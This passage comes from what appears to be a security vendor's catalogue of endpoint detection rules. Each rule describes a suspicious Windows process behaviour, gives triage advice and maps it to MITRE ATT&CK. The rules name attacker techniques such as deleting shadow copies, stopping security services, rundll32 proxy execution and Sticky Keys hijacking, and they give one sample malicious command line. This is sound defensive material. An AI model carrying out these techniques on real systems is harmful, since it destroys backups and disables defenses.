<summary>Suspicious Process - Renamed Script Host</summary>



#### Description

This detection identifies renamed copies of Windows Script Host executables. Malicious actors have been observed using copied and renamed Windows Script Host executables (cscript.exe and wscript.exe) to execute malicious code. 

#### Recommendation

Review the command line arguments being run by the renamed executable. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- Scripting - T1064


</details>



<details>
<summary>Suspicious Process - Renamed WinRAR</summary>



#### Description

Identifies executables with binary metadata matching that of the WinRAR utility, but with a different name. This is often done by attackers who will use WInRAR to either extract an archive containing additional tools, or to exfiltrate collected data.


#### Recommendation

Determine if the executable is a legitimate component being used by any software. Identify any archives it may have created or extracted and analyze their contents.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Archive Collected Data - T1560
- Archive via Utility - T1560.001


</details>



<details>
<summary>Suspicious Process - Renamed WMIC</summary>



#### Description

This detection identifies renamed copies of the WMIC utility. Malicious actors have been observed using their own copies of WMIC, renamed to avoid detection, in order to execute malicious commands.

#### Recommendation

Review the command that is being run and determine what it is doing. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Windows Management Instrumentation - T1047


</details>



<details>
<summary>Suspicious Process - Reverse URL In Command Line</summary>



#### Description

This detection identifies obfuscation of URLs via string reversal. Attackers may do this to obfuscate what they are doing.

#### Recommendation

Investigate the reversed URL. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027


</details>



<details>
<summary>Suspicious Process - RunDLL32 Executing JavaScript</summary>



#### Description

This detection identifies use of the MSHTML by RunDLL32 to execute JavaScript code. The RunHTMLApplication function from MSHTML.dll can be used by RunDLL32 to execute arbitrary JavaScript. This is commonly used by the Poweliks malware family.

#### Recommendation

Investigate the contents of the URL in the command line. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Rundll32 - T1218.011


</details>



<details>
<summary>Suspicious Process - RunDLL32 Executing StartW Function</summary>



#### Description

This detection identifies RunDLL32 running a DLL with the StartW function. StartW is a default function for Cobalt Strike-generated DLLs. 

#### Recommendation

Investigate the DLL file being run. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Rundll32 - T1218.011


</details>



<details>
<summary>Suspicious Process - Rundll32.exe Executing File From ProgramData Directory</summary>



#### Description

This detection identifies 'RunDLL32.exe' executing a DLL file in the ProgramData directory. ProgramData is a common staging directory for malicious actors. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Rundll32 - T1218.011


</details>



<details>
<summary>Suspicious Process - Rundll32.exe With No Arguments Spawns Process</summary>



#### Description

This detection identifies suspicious rundll32.exe process launching without standard argument. Malicious actors have been observed with this activity associated with Process Injection and deploying Cobalt Strike.

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055


</details>



<details>
<summary>Suspicious Process - RunDLL32 in Non-Standard Directory</summary>



#### Description

This detection identifies RunDLL32 running from unusual directories. In some cases, this is a malware binary attempting to disguise itself as the legitimate Windows system binary RunDLL32. In other cases, the file is a legitimate copy of RunDLL32 that a malicious actor has copied to a non-standard directory in order to load malicious DLLs or perform other malicious tasks.


#### Recommendation

Determine if the file is a legitimate copy of RunDLL32 or not. If it is, investigate what DLLs and functions it is running. If it is not, investigate the binary and any parent or child processes. OSINT may be able to help determine what the file is.

In both cases, attempt to determine what created the file, and anything that may have happened on the system in the time surrounding the file's creation. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Rundll32 - T1218.011


</details>



<details>
<summary>Suspicious Process: RunDLL32 launching CMD or PowerShell</summary>



#### Description

This detection identifies RunDLL32.exe executing commands using PowerShell of CMD.exe. RunDLL32.exe is often used by malicious actors to execute functions from malicious DLLs. For example 'rundll32.exe win32.dll,Start' will execute the Start function from a file called win32.dll. This will prevent any malicious processes from appearing in a Windows process listing - the process will show up as RunDLL32.exe, a trusted Windows process.

#### Recommendation

Acquire and analyze the DLL. Determine what the PowerShell or Cmd process it executed did,  and anything else that those commands may have executed. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Windows Command Shell - T1059.003
- Rundll32 - T1218.011


</details>



<details>
<summary>Suspicious Process - RunDLL32 Running JavaScript</summary>



#### Description

This detection identifies RunDLL32 being used to execute JavaScript. Malicious actors may do this to execute malicious JavaScript. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- JavaScript - T1059.007
- Rundll32 - T1218.011


</details>



<details>
<summary>Suspicious Process - RunDLL32 Runs Function Using Ordinal</summary>



#### Description

This detection identifies RunDLL32 executing a DLL function by specifying the function using an ordinal instead of a function name. This may be done by a malicious actor in order to evade detection.

#### Recommendation

Investigate the DLL being executed. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Rundll32 - T1218.011


</details>



<details>
<summary>Suspicious Process - Rundll32 Spawns svchost.exe</summary>



#### Description

This detection identifies Rundll32 process spawning svchost.exe. Malicious actors have been observed with this activity associated with Process Injection and deploying Cobalt Strike.

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055


</details>



<details>
<summary>Suspicious Process - RunDLL32 With Ordinal Spawns RunDLL32 With Ordinal</summary>



#### Description

This detection identifies the first function of a ‘.dll’ file being executed using ‘rundll32.exe’. This technique is used by malicious actors to proxy malicious code that is being executed, through a known and trusted binary.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218
- Rundll32 - T1218.011


</details>



<details>
<summary>Suspicious Process - RunDLL Pattern Match</summary>



#### Description

This detection looks for a specific naming convention in malicious DLL samples.
Example:
rundll32  \aadddddaaaadddddddddaaaaaaaadddadddaddaa.aadddddaaaadddddddddaaaaaaaadddadddaddaa,YDewXpiJkLdEfxYY


#### Recommendation

Acquire and examine the DLL file. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Rundll32 - T1218.011


</details>



<details>
<summary>Suspicious Process - runscripthelper.exe Application Whitelist Bypass</summary>



#### Description

This detection identifies ‘runscripthelper.exe’ reading PowerShell code from C:\ProgramData\Microsoft\Diagnosis\scripts and executing it. This can be used for arbitrary code execution by changing the %ProgramData% environment variable to a directory that a malicious actor has access to.

#### Recommendation

Acquire and analyze the script being executed. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - Ryuk Wake-on-Lan Feature</summary>



#### Description

This detection identifies the process command line argument '8 LAN', which is used by malicious actors in multiple variants of the Ryuk malware. When the malware is executed, it will spawn subprocesses with the argument '8 LAN'. When this argument is used, the malware scans the device's ARP table and verifies if the entries are part of the RFC1918 address space.

#### Recommendation

Investigate the parent and child process chains for suspicious activity to identify if malware is deployed on any affected systems. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Remote System Discovery - T1018
- Data Encrypted for Impact - T1486


</details>



<details>
<summary>Suspicious Process - Scheduled Task Running RunDLL32</summary>



#### Description

This detection identifies a scheduled task running RunDLL32. Malicious actors will often use this tactic to execute malicious DLL files. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Scheduled Task - T1053.005
- Rundll32 - T1218.011


</details>



<details>
<summary>Suspicious Process - Schtask.exe Creates Task from XML File Without XML Extension</summary>



#### Description

This detection identifies ‘Schtasks.exe’ being used to load a task from an XML file that has been renamed with a different extension, such as .jpg or .png, to evade detection. 


#### Recommendation

Analyze the created task and the XML file it was loaded from to determine what the task does. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Scheduled Task - T1053.005


</details>



<details>
<summary>Suspicious Process - scomma, stab or stext Flags</summary>



#### Description

This detection identifies host details being exported to a csv, a tab delimited file, or a text file. This may also be seen with power user utilities like those provided by the SysInternals suite.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- System Information Discovery - T1082


</details>



<details>
<summary>Suspicious Process - Scrcons.exe Spawns Child Process</summary>



#### Description

This detection identifies 'ScrCons.exe', the Windows Management Instrumentation scripting event consumer, executing a suspicious process. When a WMI ActiveScriptEventConsumer script launches a new process, this process will be spawned as a subprocess of 'ScrCons.exe'. Malicious actors may use ActiveScriptEventConsumer to execute malicious activity. 

#### Recommendation

Investigate the process that was launched, and anything that that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Management Instrumentation - T1047
- Windows Management Instrumentation Event Subscription - T1546.003


</details>



<details>
<summary>Suspicious Process - Scripting Engine With WordPress Uploads Directory In Command Line</summary>



#### Description

This detection identifies the WordPress uploads directory being passed to common Windows scripting engines. WordPress is a Content Management System (CMS), that a malicious actor could exploit to host malware. A malicious actor could then retrieve the malware through exploited endpoints. This allows a malicious actor to host the malware on reputable websites, and allows them to bypass reputation-based web filtering.

#### Recommendation

Review the process and URL to determine if it is malware, and rebuild the affected endpoint from a known, good baseline. Lock the user’s account and have them reset their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Suspicious Process - SC Service Create</summary>



#### Description

This detection identifies services being created via ‘cmd.exe’ or PowerShell. Creating services is a common way for malicious actors to achieve persistence.

#### Recommendation

Analyze the created service and identify what the service executes. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- System Services - T1569
- Service Execution - T1569.002


</details>



<details>
<summary>Suspicious Process - SC Stop Security Related Service</summary>



#### Description

This detection identifies the use of ‘sc.exe’ to stop security-related services. This technique is used by malicious actors to disable services that could stop malware, patch a target system, or run antivirus updates. This activity is used with ransomware-related malware families.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Impair Defenses - T1562
- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Suspicious Process - Services.exe Spawns 8 Character Mixed Case Executable</summary>



#### Description

This detection identifies a naming convention often used by Metasploit in which 'services.exe' will launch a binary randomly named with an 8 character mixed case executable name, for example 'dKhsUjWd.exe'. 

#### Recommendation

Investigate the suspiciously named executable, and anything that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Service Execution - T1569.002


</details>



<details>
<summary>Suspicious Process - Services Spawns Process From Windows Directory Root</summary>



#### Description

This detection identifies child processes of services.exe from the root of the windows directory. This behavior has been observed in use by malicious actors. 

#### Recommendation

Examine the contents of the process that was spawned, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- System Services - T1569


</details>



<details>
<summary>Suspicious Process - Set-Variable and Start-Process Passed To PowerShell</summary>



#### Description

This detection identifies ‘Set-Variable’ and ‘Start-Process’ being passed to ‘PowerShell.exe’ in the command line. ‘Set-Variable’ is specified multiple times containing pieces of longer strings that are reassembled and executed. This technique is used by malicious actors to obfuscate the PowerShell script embedded in a malicious document, which increases the likelihood of the script being executed on a target’s endpoint.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Deobfuscate/Decode Files or Information - T1140


</details>



<details>
<summary>Suspicious Process - Seven Digit Hexadecimal Executable Name</summary>



#### Description

This detection identifies processes with seven digit hexadecimal names (i.e. a7f4e89.exe) creating processes. This naming convention is often used by malicious code generators. 

#### Recommendation

Analyze the binary with the hexadecimal name. Investigate any processes it spawns. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

</details>



<details>
<summary>Suspicious Process - ShadowCopy Delete Passed To WMIC</summary>



#### Description

This detection identifies the use of ‘WMIC.exe’ with ‘shadowcopy delete’ passed to it to delete any shadow copies of files on disk. This technique is used by a malicious actor performing a ransomware attack to destroy backup copies of files on a system to increase the likelihood of a target paying to retrieve their data.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Windows Management Instrumentation - T1047
- Inhibit System Recovery - T1490


</details>



<details>
<summary>Suspicious Process - Shim Install</summary>



#### Description

This detection identifies the use of sdbinst.exe and sdb-explorer.exe which are used to install application compatibility shims. Malicious actors may install a shim to maintain persistence. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Application Shimming - T1546.011


</details>



<details>
<summary>Suspicious Process - Sihost in Non-Standard Location</summary>



#### Description

This detection identifies the Sihost.exe binary executing from a suspicious location. Malicious actors commonly attempt to disguise malware as legitimate Windows system binaries. Often these can be detected if a Windows system binary name is observed in an odd location.

#### Recommendation

Analyze the Sihost binary and attempt to determine if it is a legitimate instance of the Windows binary Sihost. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
<summary>Suspicious Process - Single Character Executable with IP Address in Command Line</summary>



#### Description

This detection identifies executables with a single character name that supply an IP address as part of their command line arguments. Malicious actors will often use single character names for various utilities that they download, such as network scanners.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


</details>



<details>
<summary>Suspicious Process - Sleep Then Delete</summary>



#### Description

This detection identifies a command instructing the system to sleep or wait, followed by deletion of a file. This is sometimes done to give malware enough time to run before deleting it from disk.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- File Deletion - T1070.004


</details>



<details>
<summary>Suspicious Process - SQLPS/SQLToolsPS Executing Suspicious PowerShell Command</summary>



#### Description

This detection identifies the use of SQLPS and SQLToolsPS to run suspicious commands. SQLPS and SQLToolsPS are included with Microsoft SQL Server and intended to be used to run SQL commandlets. An attacker can abuse SQLPS or SQLToolsPS to execute PowerShell commands that won't be logged by module or scriptblock logging.

#### Recommendation

Analyze the contents of any PowerShell scripts that are run. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - Started From Root Of Twain_32</summary>



#### Description

This detection identifies suspicious processes being executed from the root of the Windows\Twain_32 directory. Malicious actors have been observed using this directory as a staging directory for malicious activity. 

#### Recommendation

Analyze the contents of the Windows\Twain32 directory. Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Malicious File - T1204.002


</details>



<details>
<summary>Suspicious Process - Started From Users Music Directory</summary>



#### Description

This detection identifies suspicious processes being executed from the Music directory. Malicious actors have been observed using this directory as a staging directory for malicious activity. 

#### Recommendation

Analyze the contents of the Music directory. Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Malicious File - T1204.002


</details>



<details>
<summary>Suspicious Process - Started From Users Videos Directory</summary>



#### Description

This detection identifies suspicious processes being executed from the Videos directory. Malicious actors have been observed using this directory as a staging directory for malicious activity. 

#### Recommendation

Analyze the contents of the Videos directory. Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Malicious File - T1204.002


</details>



<details>
<summary>Suspicious Process - Started From Windows Debug</summary>



#### Description

This detection identifies binaries being executed from the Windows\Debug directory. This is a user writable location that should not commonly have binaries written to it or be a location that they are executed from.

#### Recommendation

Analyze the contents of the Windows\Debug directory. Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Command Shell - T1059.003
- Malicious File - T1204.002


</details>



<details>
<summary>Suspicious Process - sudoedit with Suspicious Arguments</summary>



#### Description

This detection identifies the "sudoedit" command being run with command line flags indicative of exploits of CVE-2021-3156, which will allow users to gain root privileges. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Exploitation for Privilege Escalation - T1068


</details>



<details>
<summary>Suspicious Process - Supremo Remote Access in Non-Standard Location</summary>



#### Description

This detection identifies the Supremo remote access tool running from directories that aren't part of its normal install. Malicious actors have been observed using Supremo for remote access after gaining an initial foothold on a host.

#### Recommendation

Determine whether Supremo was installed on this host by the user or by an authorized IT employee. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Remote Access Software - T1219


</details>



<details>
<summary>Suspicious Process - Svchost.exe in Non-Standard Location</summary>



#### Description

This detection identifies svchost.exe process running from a non-standard location. Normally, it is found running from system32 or syswow64 directory. This has been observed to masquerade malware processes by malicious actors such as Dridex malware.

#### Recommendation

Examine the process svchost.exe and the directory it is currently running. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
<summary>Suspicious Process - SvcHost spawns MSHTA</summary>



#### Description

This detection identifies SvcHost spawning MSHTA. This may be indicative of LethalHTA, a lateral movement technique using DCOM and HTA files.



#### Recommendation

Examine the arguments passed to MSHTA and any processes MSHTA may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Distributed Component Object Model - T1021.003
- Mshta - T1218.005


</details>



<details>
<summary>Suspicious Process - Svchost Spawns Werfault</summary>



#### Description

This detection identifies the execution of Windows Service Host spawning Windows Error Reporting process with "/h /shared Global" flags. Threat actors are often seen performing malicious activity resulting in the execution of the "Werfault.exe /h /shared Global" command.

#### Recommendation

Examine the parent/child process activity and acquire additional forensic artifacts to identify process/file dropped if necessary. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Suspicious Process - SVCHost with Unusual Arguments</summary>



#### Description

This detection identifies SVCHost running with non-standard arguments. Malicious actors will often attempt to disguise their implants as SVCHost.exe due to the fact that SVCHost is a necessary component of a Windows system, is always running, and can often have multiple instances running at once. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
<summary>Suspicious Process - SysJoker Process Names</summary>



#### Description

This detection identifies process names identified as part of the SysJoker malware family. SysJoker is a multi-platform backdoor that masquerades as a system update. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
<summary>Suspicious Process - TakeOwn or ICAcls Run Against SetHC</summary>



#### Description

This detection identifies permission modification tools being used on ‘SetHC.exe’, which is the binary for the Sticky Keys accessibility feature. By replacing this binary with a different one, a malicious actor can cause that binary to be run whenever Sticky Keys is triggered. 

#### Recommendation

Analyze the ‘SetHC.exe’ binary to determine what it may have been replaced with. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Accessibility Features - T1546.008


</details>



<details>
<summary>Suspicious Process - TaskEng Runs Script from ProgramData</summary>



#### Description

This detection identifies TaskEng running scripts from the ProgramData folder. ProgramData is a common staging directory for malicious actors.

#### Recommendation

Review the contents of the script being run. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Scheduled Task - T1053.005


</details>



<details>
<summary>Suspicious Process - TaskKill Multiple Times</summary>



#### Description

This detection identifies multiple tasks being killed in a single command. Malicious actors may use taskkill to stop any running security tools. 

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Suspicious Process - Terminal Services Started from Command Line</summary>



#### Description

This detection identifies the ‘net start termservice’ command being used to enable remote desktop access on a host. Malicious actors do this to maintain persistence via remote access after gaining an initial foothold. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. Review logs to identify any hosts that may have used RDP to access this host. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Remote Desktop Protocol - T1021.001
- Remote Access Software - T1219


</details>



<details>
<summary>Suspicious Process - TurboMailer</summary>



#### Description

This detection identifies the use of TurboMailer, observed in use post-compromise to send spam emails.

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Resource Hijacking - T1496


</details>



<details>
<summary>Suspicious Process - .txt.js File in Command Line</summary>



#### Description

This detection identifies files in command line arguments that end with the extension '.txt.js'. Windows disables the viewing of file extensions in the file browser by default, and malicious actors may use extensions like this to make a user think that the file is just a text file, as the .js extension is hidden.

#### Recommendation

Investigate the contents of the '.txt.js' file. Examine the parent process that spawned the process executing the '.txt.js' file, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Masquerading - T1036
- JavaScript - T1059.007


</details>



<details>
<summary>Suspicious Process - URL and Useragent in Javascript Command Line</summary>



#### Description

This detection identifies JavaScript payloads being run with URLs and useragents in the arguments. This can be indicative of exploit kits such as RIG.

#### Recommendation

Examine the JavaScript for anything that looks malicious. The command may be encoded with base64 character code encoding, or other common obfuscation methods. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- JavaScript - T1059.007


</details>



<details>
<summary>Suspicious Process - Users Process Spawned By RegSvr32</summary>



#### Description

This detection identifies processes spawned from the a user's directory by RegSvr32. User directories are a common location for malicious files, as no advanced permissions are needed to write to the current user's director. RegSvr32 may be loading a file from a user's directory as part of the "SquiblyDoo" app whitelisting bypass technique.

#### Recommendation

Investigate the contents of the file in the user's directory. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Regsvr32 - T1218.010


</details>



<details>
<summary>Suspicious Process - Utox Messenger</summary>



#### Description

This detection identifies the Utox application executing.  Utox is a chat program used by the Crytox Ransomware authors as a way to communicate to their victims regarding file decryption and the ransom payments.

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Data Encrypted for Impact - T1486


</details>



<details>
<summary>Suspicious Process - Utox Messenger Launched From Ransom Note</summary>



#### Description

This detection identifies the "utox.exe" program as a child process of "mshta.exe".  Utox is a chat program used by the Crytox Ransomware authors as a way to communicate to their victims regarding file decryption and the ransom payments. The Utox program can be launched from the Ransom note which is usually an .HTA file that is executed by "mshta.exe".

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Data Encrypted for Impact - T1486


</details>



<details>
<summary>Suspicious Process - VBC.exe With SText Flag</summary>



#### Description

This detection identifies execution of the .Net utility vbc.exe with the /stext flag. This has been seen observed with the HawkEye trojan in order to dump collected credentials and write them to disk.

#### Recommendation

Review the command line arguments of vbc.exe and the contents of any files it outputs to. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003


</details>



<details>
<summary>Suspicious Process - VerClsID Spawns Scripting Engine</summary>



#### Description

This detection identifies `verclid.exe` spawning common scripting engines, such as ‘PowerShell.exe’ and ‘wscript.exe’. This technique is used by malicious actors to obfuscate the script embedded within a malicious document. For this process, ‘winword.exe’ launches ‘verclsid.exe’, which will invoke a scripting engine or command shell.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- Signed Binary Proxy Execution - T1218
- Verclsid - T1218.012


</details>



<details>
<summary>Suspicious Process - VMWare Horizon Spawns Process</summary>



#### Description

This detection identifies VMWare Horizon launching various processes. VMWare Horizon is vulnerable to exploitation of the Log4Shell vulnerability, and Rapid7 has observed malicious actors targeting Horizon in-the-wild. 

#### Recommendation

Examine the process spawned by the VMWare Horizon. If it is a PowerShell process with encoded base64 data, decode this data and inspect the commands being run. If this activity is not benign or expected, consider rebuilding the host from a known, good source.

#### MITRE ATT&CK Techniques

- Exploitation for Client Execution - T1203
- Web Shell - T1505.003


</details>



<details>
<summary>Suspicious Process - VMware Workspace ONE Access Launches Process</summary>



#### Description

This detection identifies the Apache prunsrv component of VMware Workspace ONE Access launching suspicious processes. This may be indicative of remote code execution resulting from exploitation of CVE-2022-22954. See our blog post for more information: https://www.rapid7.com/blog/post/2022/04/29/widespread-exploitation-of-vmware-workspace-one-access-cve-2022-22954/

#### Recommendation

Ensure VMWare components are upgraded to the latest version. Review the process that was launched and any processes that it may have launched.  If this activity is not benign or expected, consider rebuilding the host from a known, good source.

#### MITRE ATT&CK Techniques

- Exploitation of Remote Services - T1210


</details>



<details>
<summary>Suspicious Process - Volume Shadow Service Delete Shadow Copies</summary>



#### Description

This detection identifies the use of ‘vssadmin.exe’ to delete shadow file copies. This technique is used by malicious actors to remove backup copies of files immediately prior to the execution of ransomware to increase the likelihood of a target paying the ransom. This activity can also be a result of standard optimization for virtualized systems.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Inhibit System Recovery - T1490


</details>



<details>
<summary>Suspicious Process - Volume Shadow Service Resizes Shadow Storage</summary>



#### Description

This detection identifies the Volume Shadow Service utility being used to resize the shadow storage. This is often done by ransomware, which will resize the storage to be small enough to be of essentially no use at all when restoring from backup. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Inhibit System Recovery - T1490


</details>



<details>
<summary>Suspicious Process - Wermgr Runs Script Interpreter</summary>



#### Description

This detection identifies wermgr.exe, the Windows Error Manager, spawning a script interpreter process (cmd,exe, powershell.exe, etc). This may be done by a malicious actor, either by a malicious binary masquerading as wermgr.exe, or by malicious code injected into the legitimate wermgr.exe. 

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Process Injection - T1055


</details>



<details>
<summary>Suspicious Process - Windows Credential Editor Command Line Flags</summary>



#### Description

This detection identifies command line flags that are relatively unique to Windows Credential Editor, a utility used to dump credentials from Windows systems.

#### Recommendation

Determine whether this is part of authorized administrator or security activity. Attempt to determine whether the process being run is actually Windows Credential Editor. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003


</details>



<details>
<summary>Suspicious Process - Windows Debug In Command Line</summary>



#### Description

